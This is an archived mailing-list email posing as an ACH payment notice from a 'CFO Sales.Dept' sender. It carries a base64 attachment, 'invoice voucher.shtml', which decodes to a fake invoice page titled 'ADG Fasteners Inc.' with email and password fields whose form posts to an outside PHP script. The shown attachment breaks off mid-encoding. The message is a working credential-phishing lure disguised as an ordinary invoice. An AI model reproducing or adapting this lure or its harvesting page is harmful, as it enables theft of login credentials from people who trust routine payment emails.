Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 27E8B6C9901
	for <lists+industrypack-devel@lfdr.de>; Mon, 27 Mar 2023 02:37:16 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pgarJ-0002bs-VH
	for lists+industrypack-devel@lfdr.de;
	Mon, 27 Mar 2023 00:37:14 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <laura.davies44@outlook.com>) id 1pgarI-0002bl-Dw
 for industrypack-devel@lists.sourceforge.net;
 Mon, 27 Mar 2023 00:37:13 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=MIME-Version:Content-Type:List-Unsubscribe:
 Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=BGHC237VRtZqMPJcKn6bNOif0E+tH0cb9LYbSUN/+EI=; b=WnBXHYYVxibAI74cCJSVObmoo/
 3SU+Pgjx15z1cbyGvitDal/MEhdibRvjkaoeZfMC9818CllTg/PktLMN19lsL8wt1cFETN0E8czZI
 A/u7YqMve2tK8xYCFaUYBVSTODdUDT1iUW8e/qEJ5dX8W3T0DqXNLjGUQUMAjz+w/I/s=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=MIME-Version:Content-Type:List-Unsubscribe:Message-ID:Date:Subject:To:
 From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=BGHC237VRtZqMPJcKn6bNOif0E+tH0cb9LYbSUN/+EI=; b=ZEK+gWkvE3eE67MDcE+nOF2Sxx
 wKRb+k8lRWakHAaWT9gRGQU1kIHOoupSB3O0XlzGjGwQd5enbWlK1Zn8Wrlmq/WvIG+KCrvlqwoHU
 iocCPh1BR/mx0o+36QHIMNqgH+NNnn3RY59CQuE73zeN5XN1ncg41TJlmbY0kvwaTcPg=;
Received: from mail-cwlgbr01olkn0151.outbound.protection.outlook.com
 ([104.47.20.151] helo=GBR01-CWL-obe.outbound.protection.outlook.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pgarE-0050BN-0j for industrypack-devel@lists.sourceforge.net;
 Mon, 27 Mar 2023 00:37:13 +0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=ZnqM3B6MhESFpScvrjuJ6JUAbML5OIVnUNug0nCkC8KSSk/tasCVtifXPvg2YcrRte6EOeh7Fcu3/xjBxNxGY4iMzNqfmm1qrjntxM85dzgvlX+S0vZ/jzMi8eG/5UjoR2nnXVW1DeSF+79SvCGkVuY4U5y7IYFJ84kM0cZF4u8XASvYL4SlRse+spqeEKjkSo5tGhnEWS4IM1l7OjaX4PWhv9Mcw3QBEXNTrBjJB+y89WNj6fSb55FbJw9AT+qtMIyDWiqBj5V3Apd78OxpLDSQgVgnCRY7MmPeAwUitb1/z3Txn6+UyiVzHsLu0LhNQwYMQzv4cKxkncsDxi/IqQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=BGHC237VRtZqMPJcKn6bNOif0E+tH0cb9LYbSUN/+EI=;
 b=YUxdNTJJ3+ABnN6OsWM8LkwIMA76iwnwY168aR5474yh2OukORnDINYNG+UrdYnh/l70wXd3CbPmv+xGCVlDSaqHADlAB06hrPOvbUvB9Hw5gwwGxmzXW25KZjsbYiZs55yjCon6tCx0eH8tqsSzGb9BTJqofFyx/T70UdmDHHRfCGedl+tgB/+ieKmFLgqtc04x8D5phzZ+Jm3y5V+smG9tUxhtoDnI17pZt59/XllzPuoqxaNNgDZ5eI0r0U5b/N1YEhPqgKqaR5/ukDgSZwgYFhYp0AK8uoxvp6FxK6mUcxOyO/G3vzOMJKrMmUgEI+uyAdBwGZlDaW6aINJYhg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=outlook.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=BGHC237VRtZqMPJcKn6bNOif0E+tH0cb9LYbSUN/+EI=;
 b=QzV+XQm/TIG88/lGWl3dipw+AdIFGiTcPh1hTteelu1bbxh4gDWp2ZeRLxD73mHnECu+xscX0JS2iXCeu/KBCVzZnc30PfBEji+QUbrbQkEQzOa9AthcIAsYVJaKImwDh8KUzzOUVBQ7w1sfsxvIN06j4mQ1jPaTOLjzCpd8JeEbAsWULusvrDDxFeIqF1qr1Y5buTMsA7DMu4p6B8qRL1UTxa+QeDfnthxeyhj0GqCzB7z0U58fBscvbKsXvyE2sS/xGrJCTjjR2v+kEJqznvNF3KA+4KLWUrQFTruWcRi7Ustcr13D9cbKNEZ0Od4AdQ4i2M8aZytGHCIpT5E7lw==
Received: from CWLP265MB4689.GBRP265.PROD.OUTLOOK.COM (2603:10a6:400:16c::7)
 by CWXP265MB1798.GBRP265.PROD.OUTLOOK.COM (2603:10a6:400:40::9) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6222.29; Mon, 27 Mar
 2023 00:36:59 +0000
Received: from CWLP265MB4689.GBRP265.PROD.OUTLOOK.COM
 ([fe80::454:ccb4:ff8:e67e]) by CWLP265MB4689.GBRP265.PROD.OUTLOOK.COM
 ([fe80::454:ccb4:ff8:e67e%6]) with mapi id 15.20.6222.028; Mon, 27 Mar 2023
 00:36:59 +0000
From: CFO Sales.Dept<laura.davies44@outlook.com>
To: industrypack-devel@lists.sourceforge.net
Date: 27 Mar 2023 02:34:03 +0200
Message-ID: <CWLP265MB468952B250C7830C7E72DE8D958B9@CWLP265MB4689.GBRP265.PROD.OUTLOOK.COM>
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_E619D622.93F90028"
X-TMN: [DIbignTFRob16Zl97fFT0pZkUGfTbuzo]
X-ClientProxiedBy: AS4P192CA0024.EURP192.PROD.OUTLOOK.COM
 (2603:10a6:20b:5e1::16) To CWLP265MB4689.GBRP265.PROD.OUTLOOK.COM
 (2603:10a6:400:16c::7)
X-Microsoft-Original-Message-ID: <20230327023402.978F031CA5E48CBC@outlook.com>
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: CWLP265MB4689:EE_|CWXP265MB1798:EE_
X-MS-Office365-Filtering-Correlation-Id: 017bed89-7799-4b83-4128-08db2e5af857
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 6hhX5ePXLdoOvQg28kUeskjTvbePwE+8C97yPNrcnB5CK83uW2tVmIEIAld24g6e2+EXGunPSQAnEsFi/uALp0BdiFb9Qh1M+s/2pN5DG2OhjD+Nq5Rr6ME2Ldb2ttW9AjZDcGdYE63C+nsLBIsCnYCi9ZT6m3qJTS3en7BvJlJT77HmGekmyTzwdk0HqhM/bbll1FcWSatIF5r+ADl3I3jmM6N7DYhAmK41zpw/4R7lW4DFYKWV16k40wWcNpU4kgXHvHJ5hbjUhS1IAe3uwggeYhK436F425eJcysqnK48yj5rJGJr3whl0woyedeevtbmX+cBVrDmJIjRdwAxekxVVaP2dYpTItQLvGQ3wIfQ3Q1UO0h0KW8EdOnY6XBeObOFVzlWasu9OpNu+bRJy3KPe6WZlymyrcveSEQRsyZ5LDHaxgHmQ1t/twg9W5IkFvjk/yrYTeYXBF0I4jVrPshXd9Ym4Udr+bYpmI7ZEcQKvRe1tqcRcKQWhAhorGAw
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?iso-8859-1?Q?HX3Pzk7ImJP7BUUAdb1TaschnKoqm3WB94jcaCFgUVqJFWHIOyro8FpYo9?=
 =?iso-8859-1?Q?RfgVJWc1gmgfIY8O0rxt5eYigzmML8BIIb9EKAXpPY8uMxi3ZOrJLO/QFK?=
 =?iso-8859-1?Q?sSbEnp81CnkqXcnjOejkMbH3mNzb2w/r76iPRp1OOGYUatsWZAva+bx1/B?=
 =?iso-8859-1?Q?SixUSTCZyrEL523pZrDXf8rwvqc6920ALzxSmfUKnQwBuwdtjHttoGy+A9?=
 =?iso-8859-1?Q?/0ko8/ce9ZI4jVzf4MeWXW4Nv9Cv7ZRddZYxymGNVKF1nAAAbrlEI9UdIP?=
 =?iso-8859-1?Q?f86FNcrPwQIuxnQ6SG0E+x9wlLGdm+WgmDRX4EsyMFyPMeXu7cOdb7Uqhq?=
 =?iso-8859-1?Q?o/g65F/jfHcMtUDoZeZCUcAjSH8UPwkT+J53jgiHz4GFE3Cjddih2Uktwx?=
 =?iso-8859-1?Q?nq34OFcXVRSbgQXMtYafDXfhPCl9m6MJbIuzHT8KFwYYywlW/dRRBWojmE?=
 =?iso-8859-1?Q?Ik596I3UmLhuCNa+g2/Y7mRFmN10wwsgtMfvenah1lk9VPPEh+uhaygV18?=
 =?iso-8859-1?Q?UQx1+bHkyh8TKagt0CVTFOoeCv7Zz2z+srJ+A2FvDyssLozGhaB+Wa+9tA?=
 =?iso-8859-1?Q?t0zvqFcWWLRtap55Ay+U8gsLNNlC7N/S5ReEuBVomc8HrQZq51f6qGqqfy?=
 =?iso-8859-1?Q?9NN3L+sjS6URFA8aXc+Z2bCM6+Wk0sMd654ifqThnZz7ZpUKlPHo/jTHkq?=
 =?iso-8859-1?Q?p7BfXXZD+J2ob+vcoYOebermdVBXjSV3Z0IRpx26TsZ0yMGyfOSjn7uJ+U?=
 =?iso-8859-1?Q?GbvYQlYRZBm8jnTTYms8ZxFQvMGhY6q7M0Myfuk7LYHGCwqfv4sng4nSeD?=
 =?iso-8859-1?Q?Np6kTdh2z4zmIOaQ70B2U0thuMB5vHoPmYkjrtgv8TURTv/SQ9h0m3rYWl?=
 =?iso-8859-1?Q?JaALpJT7zEddCLcV2NLZ9tkhHfGJkv3jeELIUFf1hFSV11kGJlUEm8zStd?=
 =?iso-8859-1?Q?la9GAKLObq8WKz9opQ3smWeZ5IpEKkyigRRwLEXJUJ0O3elPHqcMabnEZ7?=
 =?iso-8859-1?Q?JrM111jOq3TZ+UL1n9szlQ0maToLes7WVsgn9J8DOsB1iV3OhcOTXS7VcU?=
 =?iso-8859-1?Q?C4KnWcQSndyDvoadAbwmigpOp2UzTHDSCKReUfhzeCliYzd/xjI5aS4x5c?=
 =?iso-8859-1?Q?1H3T1g9WNWG66sV9LZNIMsHzMxVYW+NuBOPJnizfYNq13Grc2dc0Hl/Dtc?=
 =?iso-8859-1?Q?x3xuev7dyyCrzBK+6n3WTdMrWhO3tWzVM6WD3QiHepdYxYgleLSP3JvtsB?=
 =?iso-8859-1?Q?CYG/sfkpCW0cCC+dbwTpFOyvqdnFXW3H6yXMbRons=3D?=
X-OriginatorOrg: outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 017bed89-7799-4b83-4128-08db2e5af857
X-MS-Exchange-CrossTenant-AuthSource: CWLP265MB4689.GBRP265.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 27 Mar 2023 00:34:05.5227 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CWXP265MB1798
X-Spam-Score: 2.9 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Dear industrypack-devel, FYI, attached file. The complete
 version of this receipt has been attached to this
 e-mail:industrypack-devel@lists.sourceforge.net, See att [...] 
 Content analysis details:   (2.9 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.0 RCVD_IN_DNSWL_NONE     RBL: Sender listed at https://www.dnswl.org/,
 no trust [104.47.20.151 listed in list.dnswl.org]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.2 FREEMAIL_ENVFROM_END_DIGIT Envelope-from freemail username ends
 in digit [laura.davies44[at]outlook.com]
 0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
 provider [laura.davies44[at]outlook.com]
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 2.8 FROM_MISSP_FREEMAIL    From misspaced + freemail provider
X-Headers-End: 1pgarE-0050BN-0j
Subject: [Industrypack-devel] ACH Payment sent On: 3/27/2023 2:34:02
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

------=_NextPart_000_0012_E619D622.93F90028
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
1"><meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19699"></head>
<body><span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-s=
erif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
IGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2;=
 LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial">Dear industrypack-devel,</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">FYI, attached file.</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">
The complete version of this receipt has been attached to this<span>&nbsp;<=
/span><a style=3D"COLOR: rgb(17,85,204)" href=3D"mailto:industrypack-devel@=
lists.sourceforge.net" target=3D"_blank">e-mail:industrypack-devel@lists.so=
urceforge.net</a>,</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">------------------------------<wbr>----</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">See attached.</span>
 <br aria-hidden=3D"true" style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Hel=
vetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS:=
 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial">
<span style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: initia=
l">Thanks for your business</span></body></html>=

------=_NextPart_000_0012_E619D622.93F90028
Content-Type: application/octet-stream; name="invoice voucher.shtml"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="invoice voucher.shtml"

PGh0bWw+DQo8aGVhZD4NCgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2
aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPg0KCTxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29t
cGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSxjaHJvbWU9MSIgLz4NCgk8dGl0bGU+QURHIEZhc3Rl
bmVycyBJbmMuIDwvdGl0bGU+DQoNCgk8c3R5bGU+DQpib2R5LCBodG1sIHsgaGVpZ2h0OiAxMDAl
O21hcmdpbjogMDsgZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQp9
DQoqIHsNCiAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCi5iZy1pbWFnZSB7DQogIC8qIFRo
ZSBpbWFnZSB1c2VkICovDQogIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiaHR0cHM6Ly9pLnBpbmlt
Zy5jb20vMjM2eC80Ni84NS8yZC80Njg1MmRkNWZhNTFiNjliZGY1Y2M1YzY1YzcxOGVkOS5qcGci
KTsNCiAgIG9wYWNpdHk6IDAuNTsNCiAgLyogQWRkIHRoZSBibHVyIGVmZmVjdCAqLyBmaWx0ZXI6
IGJsdXIoLXB4KTsgLXdlYmtpdC1maWx0ZXI6IGJsdXIoLXB4KTsNCiAgLyogRnVsbCBoZWlnaHQg
Ki8gaGVpZ2h0OiAxNTAlOyAvKiBDZW50ZXIgYW5kIHNjYWxlIHRoZSBpbWFnZSBuaWNlbHkgKi8N
CiAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyOyBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVw
ZWF0OyBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KfQ0KDQovKiBQb3NpdGlvbiB0ZXh0IGluIHRo
ZSBtaWRkbGUgb2YgdGhlIHBhZ2UvaW1hZ2UgKi8NCi5iZy10ZXh0IHsNCiAgYmFja2dyb3VuZDog
IzE0M2IwODsNCiAgd2lkdGg6MzcwcHg7IGhlaWdodDo0NTBweDsgLXdlYmtpdC1ib3gtc2hhZG93
OiAxcHggMXB4IDE1cHggMXB4ICMwMDAwMDA7DQogIGJveC1zaGFkb3c6IDFweCAxcHggMTVweCAx
cHggIzAwMDAwMDsgYm9yZGVyLXJhZGl1czogMXB4IDI1cHggMXB4IDQwcHg7DQoNCiAgcG9zaXRp
b246IGFic29sdXRlOyB0b3A6IDUwJTsgbGVmdDogNTAlOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgt
NTAlLCAtNTAlKTsgei1pbmRleDogMjsgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KaW5wdXRbdHlw
ZT1zdWJtaXRdIHsNCiAgd2lkdGg6MjkwcHg7IGhlaWdodDo0MHB4OyBmb250LWZhbWlseTogYXJp
YWw7IGZvbnQtc2l6ZTogMTRweDsgY29sb3I6I0ZGRjsgYmFja2dyb3VuZC1jb2xvcjogIzA0ODlC
MTsgYm9yZGVyOiBzb2xpZCAxcHggIzA0ODlCMTsgYm9yZGVyLXJhZGl1czogMnB4IDEwcHggMnB4
IDEwcHg7DQogIC13ZWJraXQtYm94LXNoYWRvdzogMnB4IDJweCAxNXB4IDVweCAjMDAwMDAwOyBi
b3gtc2hhZG93OiAycHggMnB4IDE1cHggNXB4ICMwMDAwMDA7ICBmb250LXdlaWdodDpib2xkOw0K
fQ0KaW5wdXRbdHlwZT1wYXNzd29yZF0gew0KICB3aWR0aDoyOTBweDsgaGVpZ2h0OjM1cHg7IGZv
bnQtZmFtaWx5OiBhcmlhbDsgZm9udC1zaXplOiAxM3B4OyBib3JkZXItcmFkaXVzOiAzcHg7DQog
IGNvbG9yOiMwMDAwMDA7IGJhY2tncm91bmQtY29sb3I6ICNGRkY7IGJvcmRlcjogc29saWQgMXB4
ICNGRkY7IHBhZGRpbmc6IDEwcHg7DQogIH0NCmlucHV0W3R5cGU9ZW1haWxdIHsNCiAgd2lkdGg6
MjkwcHg7IGhlaWdodDozNXB4OyBmb250LWZhbWlseTogYXJpYWw7IGZvbnQtc2l6ZTogMTNweDsg
Ym9yZGVyLXJhZGl1czogM3B4Ow0KICBjb2xvcjojMDAwMDAwOyBiYWNrZ3JvdW5kLWNvbG9yOiAj
RkZGOyBib3JkZXI6IHNvbGlkIDFweCAjRkZGOyBwYWRkaW5nOiAxMHB4Ow0KICAgIH0NCjwvc3R5
bGU+DQoNCg0KPC90ZD48L3RyPg0KDQo8dHI+PHRkIGhlaWdodD0iNzUlIiAgYmdjb2xvcj0iI0ZG
RiI+DQo8ZGl2IGNsYXNzPSJiZy1pbWFnZSI+PC9kaXY+DQo8ZGl2IGNsYXNzPSJiZy10ZXh0Ij4N
Cg0KDQoJPHRhYmxlIGFsaWduPSJjZW50ZXIiIGNlbGxzcGFjaW5nPSIwIj4NCgk8dHI+PHRkIHN0
eWxlPSJoZWlnaHQ6MTBweDsiPjwvdGQ+PC90cj4NCg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWln
aHQ6OHB4OyI+PC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkPg0KCQkJCQk8Zm9ybSBtZXRob2Q9InBv
c3QiIGFjdGlvbj0iaHR0cHM6Ly9sZWdhY3lvcmdhbmljLmNvbS9vemVkemVkL3plZDAwMi5waHAi
Pg0KCQkJCQk8L3RkPjwvdHI+DQoJCQkJCTx0cj48dGQ+DQoJCQkJCQkJCTwvZm9udD4NCgkJCQkJ
CQk8L2Rpdj4NCgkJCQkJPC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6N3B4
OyI+PC90ZD48L3RyPg0KCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249ImNlbnRlciI+
DQoJCQkJCQkJCTxmb250IGZhY2U9ImFyaWFsIiBzaXplPSIxIiBjb2xvcj0iI0ZGRiI+DQoJCQkJ
CQkJCQk8Yj48L2I+DQoJCQkJCQkJCTwvZm9udD4NCgkJCQkJCQk8L2Rpdj4NCgkJCQkJPC90ZD48
L3RyPg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6N3B4OyI+PC90ZD48L3RyPg0KDQoJCQkJ
CTx0cj48dGQ+DQoJCQkJCQkJPGRpdiBhbGlnbj0iY2VudGVyIj4NCgkJCQkJCQkJPGltZyBzcmM9
Imh0dHBzOi8vZW5jcnlwdGVkLXRibjAuZ3N0YXRpYy5jb20vaW1hZ2VzP3E9dGJuOkFOZDlHY1RO
cG5QekhUMUlJZUNpeDJ2U3MtTVgzZGNxZ3F2cnFtSDdUZyZ1c3FwPUNBVSI+DQoJCQkJCQkJPC9k
aXY+DQoJCQkJCTwvdGQ+PC90cj4NCgkJCQkJPHRyPjx0ZCBzdHlsZT0iaGVpZ2h0OjsiPjwvdGQ+
PC90cj4NCg0KCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6NXB4OyI+DQoJCQkJCQkJCTxkaXYg
YWxpZ249ImNlbnRlciI+DQoJCQkJCQkJCTxmb250IGZhY2U9ImFyaWFsIiBzaXplPSIyIiBjb2xv
cj0iI0ZGRiI+DQoJCQkJCQkJCQk8Zm9udCBzaXplPSIyIj5Pbmx5IHJlY2lwaWVudCBlbWFpbCBj
